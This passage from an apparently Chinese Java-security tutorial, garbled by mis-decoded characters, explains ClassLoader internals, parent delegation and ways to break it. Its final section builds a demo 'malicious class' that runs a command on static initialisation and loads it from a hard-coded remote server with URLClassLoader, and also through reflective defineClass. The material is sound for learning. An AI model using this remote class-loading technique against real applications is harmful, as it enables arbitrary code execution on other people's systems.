&#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>java&#x2F;lang&#x2F;ClassLoader.javaä¸­defineClassæ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);<span class="number">8.</span><span class="comment">//åœ¨è°ƒç”¨å®ƒ</span></span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051928585.png" alt="image-20260105192803500"></p><p><strong>9.è¿™ä¸ªæ˜¯ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ï¼Œå…·ä½“å®ç°åœ¨è™šæ‹Ÿæœºä¸­</strong></p><h4 id="åŒäº²å§”æ´¾æ¨¡å‹ç†è§£"><a href="#åŒäº²å§”æ´¾æ¨¡å‹ç†è§£" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹ç†è§£"></a>åŒäº²å§”æ´¾æ¨¡å‹ç†è§£</h4><ol><li><p><strong>é‡å¤ç±»ï¼Œå³å¦‚æœä¸€ä¸ªç±»å¯ä»¥ç”±ä¸‰ä¸ªç±»åŠ è½½å™¨åŒæ—¶åŠ è½½ï¼Œé‚£ä¹ˆä¸€å®šä¼šç”±å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½</strong></p></li><li><p><strong>ä½¿ç”¨applicationç±»åŠ è½½å™¨å»åŠ è½½Stringå¯¹è±¡ï¼Œä»€ä¹ˆç±»åŠ è½½å™¨åŠ è½½</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051726894.png" alt="image-20260105172631808"></p></li></ol><h4 id="JVM-å¤„ç†ä¸€ä¸ªç±»ï¼Œé€šå¸¸åˆ†-3-æ®µ"><a href="#JVM-å¤„ç†ä¸€ä¸ªç±»ï¼Œé€šå¸¸åˆ†-3-æ®µ" class="headerlink" title="JVM å¤„ç†ä¸€ä¸ªç±»ï¼Œé€šå¸¸åˆ† 3 æ®µ"></a>JVM å¤„ç†ä¸€ä¸ªç±»ï¼Œé€šå¸¸åˆ† 3 æ®µ</h4><ol><li><strong>Loading åŠ è½½</strong>ï¼šæŠŠ <code>.class</code> å­—èŠ‚ç è¯»è¿›æ¥ï¼Œç”Ÿæˆ <code>Class&lt;?&gt;</code> å¯¹è±¡ï¼ˆä½†è¿˜æ²¡è·‘é™æ€ä»£ç ï¼‰ã€‚</li><li><strong>Linking é“¾æ¥</strong>ï¼šéªŒè¯(verify) &#x2F; å‡†å¤‡(prepare) &#x2F; è§£æ(resolve ç¬¦å·å¼•ç”¨)ã€‚</li><li><strong>Initialization åˆå§‹åŒ–</strong>ï¼šæ‰§è¡Œ <code>&lt;clinit&gt;</code>ï¼ˆé™æ€å˜é‡èµ‹å€¼ + <code>static {}</code>ï¼‰ã€‚</li></ol><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601042158389.png" alt="ClassLoaderWork" style="zoom:50%;" /><h3 id="2-Class-forName-pkg-A-çš„å®Œæ•´é“¾è·¯"><a href="#2-Class-forName-pkg-A-çš„å®Œæ•´é“¾è·¯" class="headerlink" title="2.Class.forName(&quot;pkg.A&quot;) çš„å®Œæ•´é“¾è·¯"></a>2.<code>Class.forName(&quot;pkg.A&quot;)</code> çš„å®Œæ•´é“¾è·¯</h3><p><strong>å…ˆæ‹¿â€œç±»åŠ è½½é”â€ï¼ˆå¹¶å‘å®‰å…¨ï¼‰</strong></p><p><code>loadClass</code> ä¼šå¯¹åŒä¸€ä¸ªç±»ååŠ é”ï¼ˆJDK 7+ æ˜¯â€œæŒ‰ç±»åç²’åº¦â€çš„é”ï¼Œé¿å…å…¨å±€å¤§é”ï¼‰ï¼Œä¿è¯å¹¶å‘åœºæ™¯ä¸‹ä¸ä¼šé‡å¤å®šä¹‰åŒä¸€ä¸ªç±»ã€‚</p><blockquote><p><strong>ç±»åŠ è½½æ˜¯å¹¶å‘æ•æ„ŸåŒº</strong>ï¼ŒJDK éœ€è¦åŒæ­¥ä¿æŠ¤ã€‚</p></blockquote><hr><p><strong>findLoadedClass(name)ï¼šå…ˆçœ‹è¿™ä¸ªç±»æ˜¯ä¸æ˜¯å·²ç»è¢«è¿™ä¸ªåŠ è½½å™¨åŠ è½½è¿‡</strong></p><p><strong>ç›®çš„ï¼šç¼“å­˜å‘½ä¸­ç›´æ¥è¿”å›</strong>ï¼Œé¿å…é‡å¤åŠ è½½&#x2F;é‡å¤ defineã€‚<br> è¿™æ˜¯é»˜è®¤ç®—æ³•çš„ç¬¬ä¸€æ­¥ã€‚ <a href="https://cr.openjdk.org/~vklang/gatherers/api/java.base/java/lang/ClassLoader.html?utm_source=chatgpt.com">CR OpenJDK</a></p><ul><li>å‘½ä¸­ï¼šç›´æ¥æ‹¿åˆ° <code>Class&lt;?&gt;</code>ï¼Œè·³åˆ°ç¬¬ 4 æ­¥ï¼ˆå¯èƒ½ resolveï¼‰</li><li>æœªå‘½ä¸­ï¼šç»§ç»­ç¬¬ 2 æ­¥</li></ul><hr><p><strong>æŠŠè¯·æ±‚â€œå§”æ´¾â€ç»™çˆ¶åŠ è½½å™¨ï¼ˆparent.loadClassï¼‰</strong></p><p>è¿™ä¸€æ­¥å°±æ˜¯æ‰€è°“â€œåŒäº²å§”æ´¾æ¨¡å‹â€çš„æ ¸å¿ƒï¼š<br> <strong>å…ˆè®©çˆ¶åŠ è½½å™¨å°è¯•åŠ è½½</strong>ï¼ˆæ›´é è¿‘â€œæ ¸å¿ƒç±»åº“â€çš„é‚£æ¡é“¾è·¯ä¼˜å…ˆï¼‰ã€‚</p><p>å…·ä½“åˆ†ä¸¤ç§ï¼š</p><ul><li><strong>parent !&#x3D; null</strong>ï¼šè°ƒç”¨ <code>parent.loadClass(name, false/resolve)</code>ï¼ˆå®ç°ç»†èŠ‚é‡Œ resolve å¯èƒ½å»¶åï¼Œæ€»ä¹‹â€œå…ˆçˆ¶åå­â€ï¼‰</li><li><strong>parent &#x3D;&#x3D; null</strong>ï¼šä½¿ç”¨ <strong>Bootstrap ClassLoader</strong>ï¼ˆè™šæ‹Ÿæœºå†…å»ºçš„é‚£ä¸ªï¼‰å»å°è¯•åŠ è½½</li></ul><blockquote><p>ç†è§£ï¼š<br> <strong>åŠ è½½ <code>java.lang.String</code> è¿™ç§æ ¸å¿ƒç±»ï¼Œè‚¯å®šå…ˆè®©â€œæœ€æƒå¨çš„åŠ è½½å™¨â€æ¥è¾“å‡ºã€‚</strong><br> è¿™æ ·èƒ½é¿å…ä½ è‡ªå·± classpath é‡Œæ”¾ä¸ªâ€œå‡ Stringâ€æŠŠ JVM æä¹±ã€‚</p></blockquote><hr><p><strong>çˆ¶åŠ è½½å™¨æ²¡æ‰¾åˆ° â†’ æ‰è½®åˆ°è‡ªå·±ï¼šfindClass(name)</strong></p><p>å¦‚æœçˆ¶åŠ è½½å™¨ï¼ˆåŒ…æ‹¬ bootstrapï¼‰éƒ½ <strong>ClassNotFoundException</strong> äº†ï¼Œæ‰ä¼šè°ƒç”¨ï¼š</p><ul><li><code>findClass(name)</code>ï¼š<strong>è®©â€œå½“å‰åŠ è½½å™¨â€è‡ªå·±å»æ‰¾å­—èŠ‚ç å¹¶ defineClass</strong><br> è¿™æ˜¯é»˜è®¤ç®—æ³•çš„ç¬¬ä¸‰æ­¥ã€‚</li></ul><p>è¿™é‡Œéå¸¸å…³é”®çš„ä¸€ç‚¹ï¼š</p><ul><li><strong><code>loadClass</code> æ˜¯â€œæ€»æ§æµç¨‹â€ï¼ˆæ¨¡æ¿æ–¹æ³•ï¼‰</strong></li><li><strong><code>findClass</code> æ‰æ˜¯â€œä½ è‡ªå®šä¹‰åŠ è½½å™¨è¦é‡å†™çš„ç‚¹â€</strong>ï¼ˆæ¯”å¦‚ä»ç½‘ç»œã€åŠ å¯†æ–‡ä»¶ã€æ•°æ®åº“é‡Œè¯» class bytesï¼‰</li></ul><blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼š<br> ä½ æƒ³â€œè§„å®šå®ƒç®— hashcode çš„æ—¶å€™ç”¨ä½ è‡ªå·±çš„ä»£ç†ç±»â€é‚£ç§é—®é¢˜ï¼Œæœ¬è´¨ä¹Ÿæ˜¯ï¼š<strong>JVM èµ°å›ºå®šå…¥å£ï¼ˆloadClassï¼‰ï¼Œä½†ä½ èƒ½æ§åˆ¶çš„æ˜¯ findClass &#x2F; defineClass çš„æ¥æºä¸è§„åˆ™</strong>ã€‚</p></blockquote><hr><p><strong>å¦‚æœ resolve &#x3D;&#x3D; trueï¼šresolveClass(klass)ï¼ˆé“¾æ¥çš„â€œè§£æâ€é˜¶æ®µï¼‰</strong></p><p>é»˜è®¤ç®—æ³•æœ€åä¸€æ­¥ï¼š<br> å¦‚æœ <code>loadClass(name, resolve)</code> é‡Œçš„ <code>resolve</code> ä¸º trueï¼Œå°±ä¼šè°ƒç”¨ <code>resolveClass(c)</code>ã€‚</p><p>è¿™ä¸€æ­¥ä½ å¯ä»¥ç†è§£æˆï¼š<br> æŠŠè¿™ä¸ªç±»é‡Œå¸¸é‡æ± çš„ç¬¦å·å¼•ç”¨ï¼ˆæ¯”å¦‚ â€œæˆ‘å¼•ç”¨äº†æŸä¸ªç±»&#x2F;æ–¹æ³•&#x2F;å­—æ®µâ€ï¼‰åœ¨éœ€è¦æ—¶åšè§£æï¼ˆresolutionï¼‰ã€‚</p><blockquote><p>æ³¨æ„ï¼šJDK&#x2F;è§„èŒƒå±‚é¢ç»å¸¸æŠŠ <strong>Linking</strong> æ‹†æˆï¼šéªŒè¯&#x2F;å‡†å¤‡&#x2F;è§£æã€‚<br> <code>resolveClass</code> æ›´è´´è¿‘â€œè§£æâ€é‚£ä¸€å—ï¼›è€Œ <strong>Class.forName çš„è¡Œä¸ºæ˜¯å¦â€œä¸»åŠ¨å®Œæˆ linkingâ€</strong> åœ¨å†å²ä¸Šè¿˜ä¸“é—¨åšè¿‡è§„æ ¼æ¾„æ¸…ï¼š<br> <code>Class.forName()</code> é•¿æœŸå®ç°å¹¶ä¸ä¿è¯â€œé™¤éåˆå§‹åŒ–å‘ç”Ÿï¼Œå¦åˆ™å°±ä¸€å®šå®Œæˆ linkingâ€ã€‚</p></blockquote><p><strong>ä¹‹åå°±æ˜¯è¿›è¡Œdefineå­—èŠ‚ç æ–‡ä»¶äº†ï¼</strong></p><h3 id="3-ClassLoader-loadClass-pkg-A-çš„å®Œæ•´é“¾è·¯"><a href="#3-ClassLoader-loadClass-pkg-A-çš„å®Œæ•´é“¾è·¯" class="headerlink" title="3.ClassLoader.loadClass(&quot;pkg.A&quot;) çš„å®Œæ•´é“¾è·¯"></a>3.<code>ClassLoader.loadClass(&quot;pkg.A&quot;)</code> çš„å®Œæ•´é“¾è·¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.getSystemClassLoader() æ‹¿åˆ°çš„é€šå¸¸æ˜¯ ç³»ç»Ÿ/åº”ç”¨ç±»åŠ è½½å™¨ï¼ˆSystem/Application ClassLoaderï¼Œå¸¸è§å®ç°æ˜¯ AppClassLoaderï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601042246011.png" alt="image-20260104224629950"></p><p><strong><code>findLoadedClass(name)</code>ï¼šæŸ¥ç¼“å­˜</strong></p><ul><li><strong>åŒä¸€ä¸ª Clas sLoader</strong> å¦‚æœå·²ç»æŠŠ <code>pkg.A</code> å®šä¹‰è¿‡äº†ï¼Œç›´æ¥è¿”å› <code>Class&lt;?&gt;</code>ï¼Œä¸ä¼šå†å»æ‰¾å­—èŠ‚ç ã€‚</li></ul><p><strong>çˆ¶å§”æ´¾ï¼š<code>parent.loadClass(name, false)</code> æˆ– Bootstrap</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051800416.png" alt="image-20260105180014365" style="zoom:80%;" /><ul><li><p>å¦‚æœ <code>parent != null</code>ï¼šäº¤ç»™ parent å»åŠ è½½ï¼ˆæ³¨æ„ä¼ çš„ä¹Ÿæ˜¯ <code>false</code>ï¼Œå³ parent ä¹Ÿé»˜è®¤ä¸ resolveï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051806368.png" alt="image-20260105180628258"></p></li><li><p>å¦‚æœ <code>parent == null</code>ï¼šèµ° <code>findBootstrapClassOrNull(name)</code>ï¼ˆä¹Ÿå°±æ˜¯ Bootstrap è·¯å¾„ï¼šJDK æ ¸å¿ƒç±»é‚£å¥—ï¼‰ã€‚</p></li></ul><ul><li><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601042235263.png" alt="image-20260104223536210"></li></ul><p><strong><code>findClass(name)</code>ï¼šç»ˆäºè½®åˆ°â€œæˆ‘è‡ªå·±æ‰¾ class æ–‡ä»¶&#x2F;JARâ€</strong></p><ul><li><p>è¿™ä¸€æ­¥åœ¨ä¸åŒåŠ è½½å™¨é‡Œå®ç°ä¸åŒï¼šæ¯”å¦‚åº”ç”¨ç±»åŠ è½½å™¨ä¼šæŒ‰ classpath &#x2F; module path å»æ‰¾ã€‚</p></li><li><p><code>findClass</code> çš„å…¸å‹å·¥ä½œå°±æ˜¯ï¼šè¯»åˆ° <code>.class</code> å­—èŠ‚ â†’ <code>defineClass(...)</code> â†’ JVM æŠŠå®ƒâ€œå®šä¹‰â€ä¸ºä¸€ä¸ª <code>Class&lt;?&gt;</code>ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601051811811.png" alt="image-20260105181103736"></p></li></ul><p><strong>ä¸‹ä¸€æ­¥ä¾¿æ˜¯defineï¼ŒåŠ è½½å­—èŠ‚ç æ–‡ä»¶</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601042252933.png" alt="image-20260104225221895" style="zoom:67%;" /><p><strong><code>resolveClass(c)</code>ï¼šåªåšâ€œé“¾æ¥çš„ä¸€éƒ¨åˆ†â€ï¼Œä¸åˆå§‹åŒ–</strong></p><ul><li>åªæœ‰ä½  <code>resolve=true</code> æ‰ä¼šèµ°åˆ°è¿™ä¸€æ­¥ã€‚é»˜è®¤ <code>loadClass(name)</code> ä¸ä¼šèµ°ã€‚</li></ul><h2 id="å››ã€æ‰“ç ´åŒäº²å§”æ´¾æœºåˆ¶"><a href="#å››ã€æ‰“ç ´åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="å››ã€æ‰“ç ´åŒäº²å§”æ´¾æœºåˆ¶"></a>å››ã€æ‰“ç ´åŒäº²å§”æ´¾æœºåˆ¶</h2><h3 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h3><p>é‡å†™ loadClass æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span>(name.startsWith(<span class="string">&quot;java.&quot;</span>) || name.startsWith(<span class="string">&quot;javax.&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">    &#125;<span class="comment">//å¦‚æœæ˜¯ç³»ç»Ÿæ–‡ä»¶ï¼Œäº¤äºˆçˆ¶ç±»åŠ è½½</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å»æ‰åŒäº²å§”æ´¾æœºåˆ¶ä»£ç </span></span><br><span class="line">    </span><br><span class="line">    <span class="type">byte</span>[] data = loadClassData(name);<span class="comment">//è¿™ä¸ªå‡½æ•°åªæ˜¯åšæ¨¡æ‹Ÿä¸€ä¸‹</span></span><br><span class="line">    <span class="keyword">return</span> defineClass(name, data, <span class="number">0</span>, data.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ è½½ main ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">BreakClassLoader1</span> <span class="variable">classLoader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BreakClassLoader1</span>();</span><br><span class="line">    classLoader1.setBasePath(<span class="string">&quot;D:\\lib\\&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz1 = classLoader1.loadClass(<span class="string">&quot;com.it.chaun&quot;</span>);<span class="comment">//javaä¸­æœ‰é¢„å…ˆå¤„ç†javaå¼€å¤´çš„æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸å¯èƒ½å®ç°åŠ è½½javaç±»</span></span><br><span class="line">    clazz1.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>æ­¤æ—¶ï¼Œé»˜è®¤çš„çˆ¶ç±»åŠ è½½å™¨ä¸º application ç±»åŠ è½½å™¨</strong></p><p>javaæºç å®ç°å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(checkCreateClassLoader(), getSystemClassLoader());<span class="comment">//è¿™ä¸ªåœ¨ä¸‹æ–¹æœ‰æ‰€è§£é‡Š</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">ClassLoader</span><span class="params">(Void unused, ClassLoader parent)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    <span class="keyword">if</span> (ParallelLoaders.isRegistered(<span class="built_in">this</span>.getClass())) &#123;</span><br><span class="line">        parallelLockMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">        package2certs = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">        assertionLock = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// no finer-grained lock; lock on the classloader instance</span></span><br><span class="line">        parallelLockMap = <span class="literal">null</span>;</span><br><span class="line">        package2certs = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        assertionLock = <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ClassLoader.getSystemClassLoader()</code> é‡Œè¿™ä¸ªâ€œç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystem Class Loaderï¼‰â€ï¼Œå¯ä»¥æŠŠå®ƒç†è§£æˆï¼š</p><blockquote><p><strong>JVM å¯åŠ¨ä½ çš„åº”ç”¨æ—¶ï¼Œé»˜è®¤ç”¨æ¥åŠ è½½â€œåº”ç”¨ä»£ç &#x2F;ç¬¬ä¸‰æ–¹ä¾èµ–â€çš„é‚£ä¸ªä¸»åŠ›åŠ è½½å™¨</strong><br> ä¹Ÿå¸¸è¢«å«åš <strong>Application ClassLoaderï¼ˆåº”ç”¨ç±»åŠ è½½å™¨ï¼‰</strong>ã€‚</p></blockquote></li></ul><p><strong>æ‰“ç ´åŒäº²å§”æ´¾çš„æ ‡å‡†åšæ³•</strong>ï¼šé‡å†™ <code>loadClass(name, resolve)</code>ï¼ˆchild-firstï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601052022526.png" alt="image-20260105202233307"> </p><h2 id="äº”ã€JDK9ä¹‹åçš„æ–°å˜åŒ–"><a href="#äº”ã€JDK9ä¹‹åçš„æ–°å˜åŒ–" class="headerlink" title="äº”ã€JDK9ä¹‹åçš„æ–°å˜åŒ–"></a>äº”ã€JDK9ä¹‹åçš„æ–°å˜åŒ–</h2><p>ä¸Šæ–‡ä»‹ç»çš„éƒ½æ˜¯djk8ä»¥åŠ8ä¹‹å‰çš„å…·ä½“ç±»åŠ è½½å™¨å®ç°</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601052015931.png" alt="image-20260105201516373"></p><p><strong>jdk9ä¹‹åï¼Œå¼•å…¥äº†moduleçš„æ¦‚å¿µ</strong></p><p>ç±»åŠ è½½ä»ä¹‹å‰çš„ jar åŒ…åŠ è½½æ”¹å˜ä¸ºä» jmod æ–‡ä»¶ä¸­åŠ è½½</p><p>å¤§æ¦‚æœ‰ä»¥ä¸‹å˜åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601052017700.png" alt="image-20260105201722505"></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601052018231.png" alt="image-20260105201824870"></p><p><strong>applicationåªæ˜¯ç»§æ‰¿ä¸Šå‘ç”Ÿå˜åŒ–ï¼Œå…¶ä»–æ²¡æœ‰æ”¹å˜</strong></p><h2 id="å…­ã€åˆ©ç”¨å…¶åŠ è½½ä»»æ„ç±»"><a href="#å…­ã€åˆ©ç”¨å…¶åŠ è½½ä»»æ„ç±»" class="headerlink" title="å…­ã€åˆ©ç”¨å…¶åŠ è½½ä»»æ„ç±»"></a>å…­ã€åˆ©ç”¨å…¶åŠ è½½ä»»æ„ç±»</h2><p><strong>åˆ›å»ºæ¶æ„ç±»ï¼Œå¹¶ä¸”é…ç½®åˆ°äº‘æœåŠ¡å™¨ä¸Š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CL8</span> &#123;</span><br><span class="line">  <span class="keyword">static</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-URLClassLoader"><a href="#1-URLClassLoader" class="headerlink" title="1.URLClassLoader"></a>1.<code>URLClassLoader</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://101.200.184.201:7070/&quot;</span>)&#125;</span><br><span class="line">);</span><br><span class="line">Class&lt;?&gt; cls = classLoader.loadClass(<span class="string">&quot;CL8&quot;</span>);</span><br><span class="line">cls.newInstance();<span class="comment">//åˆå§‹åŒ–ï¼Œè°ƒç”¨staticä»£ç å—</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061833926.png" alt="image-20260105220251488" style="zoom:50%;" /><ul><li><p><strong>è¿™ä¸ªè¿˜å¯ä»¥ç”¨å…¶ä»–åè®®</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:// new URL[]&#123;new URL(&quot;http://101.200.184.201:7070/&quot;)&#125;</span><br><span class="line">file:// new URL[]&#123;new URL(&quot;file:///C:\\Users\\32768\\Desktop\\&quot;)&#125;</span><br><span class="line">jar://  new URL[]&#123;new URL(&quot;jar:file:///C:\\Users\\32768\\Desktop\\javasec1-1.0-SNAPSHOT.jar!/&quot;)&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-ClassLoader-defineClass"><a href="#2-ClassLoader-defineClass" class="headerlink" title="2.ClassLoader#defineClass"></a>2.<code>ClassLoader#defineClass</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClass1</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\32768\\Desktop\\CL8.class&quot;</span>));</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) defineClass1.invoke(cl,<span class="string">&quot;CL8&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">c.newInstance();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>æ³¨æ„ï¼ŒdefineClassè¿™ä¸ªæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œéœ€è¦ä½¿ç”¨åå°„è°ƒç”¨</strong></li></ul><h3 id="3-Unsafeç±»è·å–"><a href="#3-Unsafeç±»è·å–" class="headerlink" title="3.Unsafeç±»è·å–"></a>3.<code>Unsafe</code>ç±»è·å–</h3><ul><li><strong>java å­˜åœ¨ä¸€ä¸ª sun&#x2F;misc&#x2F;Unsafe.java è¿™ä¸ªç±»å¯¹è±¡ï¼Œæ­¤ç±»å¯¹è±¡ä¸‹é‡å†™äº†ä¸€ä¸ªå…¬å¼€çš„é™æ€æ–¹æ³• define å¯ä»¥ä½¿ç”¨å®ƒåŠ è½½ç»™å®šå­—èŠ‚ç æ–‡ä»¶</strong></li></ul><p>ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¯¥ç±»æ˜¯å•ä¾‹ç±»æ¨¡å¼ï¼Œæ„é€ 